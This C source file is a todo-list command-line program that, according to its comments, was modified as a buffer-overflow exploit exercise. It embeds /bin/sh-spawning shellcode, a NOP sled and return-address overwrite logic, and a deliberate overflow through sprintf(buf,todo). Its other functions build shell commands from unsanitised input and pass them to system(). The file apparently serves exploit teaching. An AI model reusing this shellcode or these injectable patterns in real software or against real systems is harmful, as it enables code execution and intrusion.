/*
 	TODOS - todo list in your terminal
	created by MarizMelo (c) 2012
	http://github/jmarizgit/todo.c
	version 1.0.1
*/
/*
 this c file is modifeid, and the aim is that to use bufferoverflow to exploit it. In this program, the user need to run it in gdb and find the right returnaddress what they want first, and then they need to change the value of retaddr so that it can work in gdb.
*/
//LIBRARIES
#include <stdio.h>
#include <string.h>

//CONSTANTS
#define PATH "./.todo_file" 
#define TEMP "./.todo_tmp"

//TYPEDEFS
typedef enum { false, true } bool;

//to store address the user input
union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

//FUNCTIONS
void init();
bool fileExists();
bool emptyFile();
void showAll();
void showCompleted();
void showTodos();
void addTodo(char todo[]);
void completeTodo(char todo[]);
void deleteTodo(char todo[]);
void deleteTodos();
void showHelp();
void uninstallTodo();

//shellcode value
char shellcode[] = {"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"};

//when flag == 0, it is todo program, when the flag == 1, the program can be exploited.
int flag = 0;
int main(int argc, char *argv[]){
    int ret = 0;
    int i;
    char args[1000];

//check if the third argment is equal to "exploit", if it equals, it will set the flag = 1 and execute the exploit
    if (argc > 3 && strcmp(argv[2],"exploit") == 0){
    flag =1;
//modify the returnaddress and make it point to shellcode.This should be user input
    //char retaddr[] = "\xc0\xcf\xff\xff";

//add \x90 to the buffer stack
    for (i=0;i<215;i++){
        strcat(args, "\x90");
    }
// add the value of shellcode
    strcat(args, shellcode);

    char taintedbuf[2048] __attribute__ ((aligned (8)));
    // to store the returnaddr   
    unsigned long int shellcodeaddr, retfptraddr;
    int taintedbufWritePtr, taintedbufWriteCnt;
 
    if (argc == 4) {
		//sscanf(argv[1],"%lx",&shellcodeaddr);
		sscanf(argv[3],"%lx",&retfptraddr);
	}

// clear taintedbuf   
    memset(taintedbuf,0,sizeof(taintedbuf));
 
//store the starting address of the buffer(user supplied) in tainted buffer
    taintedbufWritePtr = 0;
    intUnion.integer=retfptraddr;
    taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];	
    taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];	
    taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];	
    taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
    
    for (i=0;i<48;i++){
	strcat(args, taintedbuf);
     
     }
// modify the input of user and send these parameters to real_main
    argc = 3;
    argv[2] = args;
    }
    ret = real_main(argc, argv);
    return ret;
}


//MAIN PROGRAM
int real_main ( int argc, char *argv[] ){
	bool exists = fileExists();
	//if user write an argument on command
	if(argv[1] && exists){
		//if argument is "-" show only completed todos
		if(strcmp(argv[1],"-")==0){
			showCompleted();
		//else argument is "+" show only active todos
		}else if(strcmp(argv[1],"+")==0){
			showTodos();
		//else if second argument is "add" and third argument exists, include new todo
		}else if(strcmp(argv[1],"add")==0  && argv[2]){
			addTodo(argv[2]);
		//else if second argument is "done" and third argument exists, move todo to completed list
		}else if(strcmp(argv[1],"done")==0 && argv[2]){
			completeTodo(argv[2]);
		//else if second argument is "del" and third argument exists, delete corresponding todo
		}else if(strcmp(argv[1],"del")==0 && argv[2]){
			deleteTodo(argv[2]);
		//else if second argument is "clean", remove all todos from list
		}else if(strcmp(argv[1],"clean")==0){
			deleteTodos();
		//else if second argument is "help", display list of available commands
		}else if(strcmp(argv[1],"help")==0){
			showHelp();
		}else if(strcmp(argv[1],"uninstall")==0){
			uninstallTodo();
        //else if second argument is "list", create list with selected name
		}else{
			showAll();
		}//if_else	
	}else if(exists){
		showAll();
	}else if(argv[1] && strcmp(argv[1],"init")==0){
		init();
	}else{
		printf("\nTODO repository do not exist\nTry use - todo init\n\n");
	}//if_else
	return 0;
}//main

//CREATE TODO FILESYSTEM
void init(){
	FILE* file;
	if ( file = fopen(PATH, "a"))
    {
        fclose(file);
    }
    printf("\nTODO repository created!\n\n");
}//init()

//VERIFY IF FILE EXISTS
bool fileExists()
{
	FILE* file;
    if ( file = fopen(PATH, "r"))
    {
        fclose(file);
        return true;
    }else{
    	return false;
    }
}//fileExists()

//CHECK EMPTY FILE
bool emptyFile(){
	FILE* file;
	file = fopen (PATH,"rb");
	fseek(file, 0L, SEEK_END);
	if (ftell(file) == 0){
		fclose(file);
		return true;
	}else{
		fclose(file);
		return false;
	}//if_else
}//emptyFile()

//DISPLAY ALL TODOS
void showAll(){
	char buf[100];
	if(!emptyFile()){
		strcpy(buf,"cat -n ");
		strcat(buf, PATH);
		system(buf);
	}else{
		printf("\nNo todos on the list\nTry use - todo add \"todo name\"\n\n");
	}//if
	return;
}//showAll()

//DISPLAY ONLY COMPLETED TODOS
void showCompleted(){
	char buf[100];
	strcpy(buf, "cat -n ");
	strcat(buf, PATH);
	strcat(buf, " | awk '/[0-9]\\t\\-/'");
	system(buf);
	return;
}//showCompleted()

//DISPLAY ONLY PENDING TODOS
void showTodos(){
	char buf[100];
        strcpy(buf, "cat -n ");
        strcat(buf, PATH);
        strcat(buf, " | awk '/[0-9]\\t\\+/'");
        system(buf);
	return;
}//showTodos()i

//ADD NEW TODO
void addTodo(char todo[]){
char buf[400];
// when the flag is equal 1, it may exploit
if (flag == 1){
// use register to printf the address of esp,ebp,returnaddress, in this way, we can know these addresses in cmd.
	register int sp asm ("sp");
	register int ebp asm ("ebp");
	printf("Put this value as input: printbuf(shellcodeaddr)=%x, retaddr=%x, *retaddr=%x\n", buf, (unsigned long *)(ebp+4), *(unsigned long *)(ebp+4));
	sprintf(buf,todo);
	return;}
// run the original application when flag=0
	strcpy(buf, "echo \"+ ");
	strcat(buf, todo);
	strcat(buf, "\" > ");
	strcat(buf, TEMP);
	strcat(buf, "; cat ");
	strcat(buf, PATH);
	strcat(buf, " >> ");
	strcat(buf, TEMP);
	strcat(buf, "; cat ");
	strcat(buf, TEMP);
	strcat(buf, " > ");
	strcat(buf, PATH);
	system(buf);
	return;
}//addTodo()

//MARK TODO AS COMPLETED
void completeTodo(char todo[]){
	char buf[200];
	strcpy(buf, "sed -n ");
	strcat(buf, todo);
	strcat(buf, "p ");
	strcat(buf, PATH);
	strcat(buf, " | sed 's/^\\+/\\-/' >> ");
	strcat(buf, PATH);
	strcat(buf, "; sed ");
	strcat(buf, todo);
	strcat(buf, "d ");
	strcat(buf, PATH);
	strcat(buf, " > ");
	strcat(buf, TEMP);
	strcat(buf, "; cat ");
	strcat(buf, TEMP);
	strcat(buf, " > ");
	strcat(buf, PATH);
	system(buf);
	return;	
}//completeTodo()

//REMOVE SPECIFIC TODO
void deleteTodo(char todo[]){
	char buf[200];
	strcpy(buf, "sed -e ");
	strcat(buf, todo);
	strcat(buf, "d ");
	strcat(buf, PATH);
	strcat(buf, " > ");
	strcat(buf, TEMP);
	strcat(buf, "; cat ");
	strcat(buf, TEMP);
	strcat(buf, " > ");
	strcat(buf, PATH);
	system(buf);
	return;	
}//deleteTodo()

//REMOVE ALL TODOS
void deleteTodos(){
	char buf[50];
	strcpy(buf, "> ");
	strcat(buf, PATH);
	system(buf);
	return;
}//deleteTodos()

//SHOW SYSTEM HELP
void showHelp(){
	printf("\n TODO - command line todo list MM (c) 2012\n");
	printf(" --------------------------------------------\n\n");
	printf(" Usage:\ttodo [option] <string>\n");
	printf("\n List of options\n\n");
	printf(" init\tstarts todo list on current folder\n");
	printf(" +\tdisplays only active todos\n");
	printf(" -\tdisplay only completed todos\n");
	printf(" add\tfollowed by QUOTED string (ex.:\"my new todo\") includes a new todo\n");
	printf(" done\tfollowed by todo's ID number, marks todo as completed\n");
	printf(" del\tfollowed by todo's ID number, remove todo from current list\n");
	printf(" clean\tdeletes all list of todos ***USE WITH MODERATION***\n");
	printf(" uninstall\tremove TODO application\n");
	printf(" help\tdisplay a quick command reference for the system\n\n");
	return;
}//showHelp()

//UNINSTALL TODO SYSTEM
void uninstallTodo(){
	system("/usr/local/todo/./uninstall.sh");
	return;
}//uninstallTodo()
